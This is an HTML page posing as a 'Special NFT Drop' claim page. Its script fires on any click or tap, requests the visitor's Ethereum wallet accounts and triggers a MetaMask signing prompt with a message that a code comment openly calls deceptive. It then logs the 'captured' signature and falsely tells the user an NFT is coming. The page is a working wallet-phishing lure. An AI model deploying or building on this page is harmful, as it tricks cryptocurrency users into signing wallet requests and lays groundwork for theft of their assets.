<!DOCTYPE html>
<html>
<head>
  <title>Claim NFT</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      margin-top: 100px;
    }
    #claim {
      padding: 20px 40px;
      font-size: 20px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <h1>üéÅ You‚Äôve been selected for a Special NFT Drop!</h1>
  <p>Click anywhere on the screen to claim.</p>

  <script>
    let triggered = false;

    async function triggerSign() {
      if (triggered || typeof window.ethereum === "undefined") return;
      triggered = true;

      try {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });

        // Create a deceptive message
        const message = `Confirm you are eligible to claim NFT. Wallet: ${accounts[0]}`;

        // Trigger MetaMask sign prompt
        const signature = await ethereum.request({
          method: 'personal_sign',
          params: [message, accounts[0]]
        });

        console.log("Signature captured:", signature);
        alert("‚úÖ Signature received. NFT will be sent!");
      } catch (err) {
        console.error("Signature rejected:", err.message);
      }
    }

    // Trigger on ANY click or tap
    document.addEventListener("click", triggerSign);
    document.addEventListener("touchstart", triggerSign);
  </script>
</body>
</html>
